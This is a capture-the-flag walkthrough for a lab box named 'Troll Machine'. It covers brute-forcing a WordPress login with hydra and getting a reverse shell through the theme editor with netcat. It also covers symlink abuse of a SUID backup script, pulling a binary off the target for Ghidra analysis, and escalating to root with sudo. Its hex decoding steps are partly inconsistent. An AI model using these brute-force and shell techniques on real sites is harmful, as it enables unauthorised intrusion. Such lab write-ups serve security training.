
## Progression Tree (Exploit Flow)

![Progression Tree](Assets/Pasted%20image%2020250501075251.png)


## Detailed Steps for PWNING the Troll Machine

### STEP 1: Brute Forcing the WP login page


![Login](Assets/Pasted%20image%2020250501081101.png)

- It is essential to find valid username in order to brute force the login page.
- This can be achieved with variety of ways: 
	
	- Using a `json` endpoint
	
    ![JSON Enumeration](Assets/Pasted%20image%2020250501081558.png)
	- Brute forcing the username is possible via the login form as the response varies for a valid vs an invalid account.
		- For an user that does not exist this the response we get the following error.
      ![Invalid user error](Assets/Pasted%20image%2020250501081824.png)

		- Using default/common usernames we can make a guess for a valid user.
      ![Valid Guess](Assets/Pasted%20image%2020250501082054.png)

- Now that we know a valid user we are going use hydra to bruteforce the login page
- Following is how the hydra command look like
	- `hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt 10.10.104.139 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:ERROR" -v`
	- As you may have noticed instead of `rockyou.txt` list we are using `2023-200_most_used_passwords.txt`, this is because the `rockyou.txt` is massive and will take a lot time so i always prefer to start with smaller lists first.
	
	![Hydra Success](Assets/Pasted%20image%2020250501082753.png)
- And within couple of minutes we have our credentials which we will be using to login the admin panel.
- Credentials: admin:theworldinyourhand

### STEP 2: Getting RCE Via PHP SHELL Through ADMIN PANEL

- After logging in admin panel hover over tools, and select `Theme File Editor`.

	![Payload](Assets/Pasted%20image%2020250501180423.png)

- After which select `Theme Functions`.
- From `revshell.com` I will copy the PHP payload (PHP PentestMoneky) to get RCE.
	
	![Paste Shell](Assets/Pasted%20image%2020250501180518.png)

	![Netcat Listener](Assets/Pasted%20image%2020250501180639.png)

- Using netcat let's up open a listener to catch the shell.
	![Shell Access](Assets/Pasted%20image%2020250501180853.png)

	(P.S Using rlwrap will allow you to cycle through commands that you give the target machine and will make you life a whole lot easier :D)
- Once we click `Update File` button in the `Edit Theme Panel` , we will get the shell.
	![Important Note](Assets/Pasted%20image%2020250501181145.png)

### STEP 3: Enumeration

- We see that their are two users on the Machine. 
	- Cypher
	- Robert
- We can't enter Robert's home directory but we can enter Cypher's home directory where we find an interesting file which has following content. File name `important.txt`
	- ![Hidden Password](Assets/Pasted%20image%2020250501181524.png)

- According to file Cypher has a habit of hiding password at random places across the system. Let's do some manual enumeration to find the password.
- In  `/etc` folder we find that there exists and unusual folder named `i` inside which following folders exists without any other file.
	![User Switch Success](Assets/Pasted%20image%2020250501181708.png)

- Interesting enough it does look like some password.
- Let's try switching user to Cypher with this password.
	- `ilikegames123`
	![Symlink](Assets/Pasted%20image%2020250501183044.png)
- And sure enough we were able to login as user Cypher.
- This gives us the first flag `user.txt` which inside Cypher's home directory.
(P.S You will need to make the shell interactive by using the following command `python3 -c 'import pty; pty.spawn("/bin/bash");'`)


### STEP 4: Analyzing and Abusing the backup script via Symlink

- According to the `important.txt` file there should be a backup script with suid bit which might be able to exploit to impersonate Robert.
- The `/opt/backup_scripts/backup ` script allows user to create a backup of any file inside `/var/log/` folder. It accepts path as argument and trying to break seems futile since there is input filtering in the script.
- But interestingly enough there is folder named `cypher` in `/var/log/` directory , which is owned by Cypher. 
- As cypher we can enter Robert's home directory and see an interesting binary `mysql_test_script` which we are not allowed to access.

- To exploit the backup script we are going to create a symlink in `/var/log/cypher/` folder which will be pointing towards `mysql_test_script`.
	![Backup Triggered](Assets/Pasted%20image%2020250501183152.png)
	Command: `ln -sf /home/robert/mysql_test_script /var/log/cypher/script`
	
- After which we can run backup script to create a backup of the file in `/backup` folder
	![Python Server](Assets/Pasted%20image%2020250501183901.png)

### STEP 5: Using Ghidra to analyze the binary file

- On the target machine we will start a python server inside the `/backup` folder. Make sure you are in the `/backup` folder and execute the following command.
	![Wget Download](Assets/Pasted%20image%2020250501183951.png)
	Command: `python -m http.server 9999 &`
(P.S Adding & will make sure that shell remains usable otherwise you will have to open a new connection )
- And on the attacker machine based on the file name execute the following 
	![Ghidra Analysis](Assets/Pasted%20image%2020250501184450.png)
	Command: `wget http://10.10.147.108:9999/script_backup_20250501_130009`
(Or just visit http://10.10.147.108:9999/ in your browser and click on the file to download it.)

- Inside Ghidra we find the script is fairly simple. Going to the main function we we can see the command being used and make an educated guess what the password is being stored as.
	 ![Root Access](Assets/Pasted%20image%2020250501185701.png)

- Given: 
- local_28 = 0x6e656666306d6131
- local_20 = 0x39303165766973
- uStack_19 = 0x242439

- Step-by-Step Breakdown: 
 
 - local_28 = 0x6e656666306d6131
 - This hexadecimal number 0x6e656666306d6131 can be broken down into a sequence of 8 bytes:
 - Hex to ASCII Conversion: 
	 - 0x6e → n 
	 - 0x65 → e 
	 - 0x66 → f
	 - 0x66 → f
	 - 0x30 → 0 
	 - 0x6d → m
	 - 0x61 → a
	 - 0x31 → 1
 - This results in the ASCII string neffoma1
 
 - local_20 = 0x39303165766973 
 - This hexadecimal number 0x39303165766973 can be broken down into 8 bytes: 
 - Hex to ASCII Conversion: 
	 - 0x39 → 9 
	 - 0x30 → 0 
	 - 0x31 → 1 
	 - 0x65 → e 
	 - 0x76 → v 
	 - 0x69 → i 
	 - 0x73 → s

-  uStack_19 = 0x242439 
- This hexadecimal number 0x242439 can be broken down into 3 bytes:
- Hex to ASCII Conversion:
- 0x24 → $ 
- 0x24 → $ 
- 0x39 → 9 
- This results in the ASCII string `$$9`.

- We get the final password: `1am0ffens1ve1099$$`.

- Using the above credentials we were successfully able to login as the user `robert`
- We also find that user `robert` can execute commands as root. Hence we can get root.txt from /root directory now.
- Command : `sudo -i` will make us the root.

	![[Pasted image 20250501185701.png]]

- AND THE TROLL MACHINE HAS BEEN PWNED!
